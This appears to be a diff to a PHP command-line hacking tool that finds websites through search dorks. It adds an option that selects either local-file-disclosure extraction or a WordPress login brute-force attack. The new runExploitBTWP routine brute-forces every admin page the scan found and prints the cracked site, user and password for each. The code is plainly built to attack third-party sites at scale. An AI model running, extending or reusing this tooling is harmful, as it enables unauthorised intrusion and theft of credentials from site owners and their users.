@@ -102,8 +102,9 @@ class SearchHackingEngine extends Command
                     new InputOption(
                         'exploit',
                         null,
-                        InputOption::VALUE_NONE,
-                        'Set the exploit for exploit vulnerabilities, function only check lfd: --exploit'),
+                        InputOption::VALUE_REQUIRED,
+                        'Set the exploit for exploit vulnerabilities, examplo exploit lfd: --exploit="lfd" or exploit
+                        brute force in WordPress --exploit="btwp"'),
 
                     /*new InputOption(
                     	'hashs',
@@ -130,6 +131,7 @@ class SearchHackingEngine extends Command
             'torl' => $this->torl,
             'virginProxies' => $this->vp,
             'check' => $this->check,
+            'exploit' => $this->exploit,
         );
         $dorks = explode('||',$commandData['dork']);
         foreach($dorks as $dork){
@@ -356,7 +358,7 @@ class SearchHackingEngine extends Command
             $resultFinal = array();
             $nameFileIsAdmin = $nameFile.'_isAdmin';
             $site = new Vulnerabilities\DefaultSite($commandData, $result);
-            $resultFinal['site'] = $site->check();
+            $resultFinal['isAdmin'] = $site->check();
             $this->saveTxt($resultFinal, $nameFileIsAdmin);
             $this->printResult($resultFinal, $output, 'Result list of admin page:');
             $this->printResumeResult($output, 'Patch File of admin page:', $nameFileIsAdmin);
@@ -381,15 +383,18 @@ class SearchHackingEngine extends Command
             $this->printResumeResult($output, 'Patch File of Local File Inclusion:', $nameFileLfi);
         }
 
-        if($this->exploit){
+        if($this->exploit["lfd"]){
             $this->runExploitLFD($resultFinal,$commandData,$output);
+        }
+        if($this->exploit["btwp"]){
+            $this->runExploitBTWP($resultFinal,$commandData,$output);
         }
     }
 
     protected function runExploitLFD($result, $commandData, OutputInterface $output){
 
         if (in_array('lfd', $this->check)) {
-            $output->writeln('<info>********Executing command exploit*******</info>');
+            $output->writeln('<info>********Executing command exploit LFD*******</info>');
             $output->writeln('<info>********Extract Files of Targets********</info>');
             $output->writeln('*-------------------------------------------------');
             $output->writeln('');
@@ -405,6 +410,23 @@ class SearchHackingEngine extends Command
             $output->writeln('*-------------------------------------------------');
             $output->writeln('find results in folder /results/lfd/');
             $output->writeln('');
+        }
+    }
+
+    protected function runExploitBTWP($result, $commandData, OutputInterface $output){
+        $output->writeln('<info>********Executing command exploit Brute Force in WordPress*******</info>');
+        $output->writeln('<info>******************Extract Files of Targets***********************</info>');
+        $output->writeln('*-----------------------------------------------------------------------------');
+        $output->writeln('');
+        $btwp=new Exploits\BruteForceWordPress($commandData);
+        foreach($result['isAdmin'] as $url){
+            $result=$btwp->execute($url);
+        }
+        $output->writeln('<info>********************Print Results***********************</info>');
+        foreach($result as $res){
+            $output->writeln("Site: ".$res['site']);
+            $output->writeln("User: ".$res['user']);
+            $output->writeln("Password: ".$res['password']);
         }
     }
 }
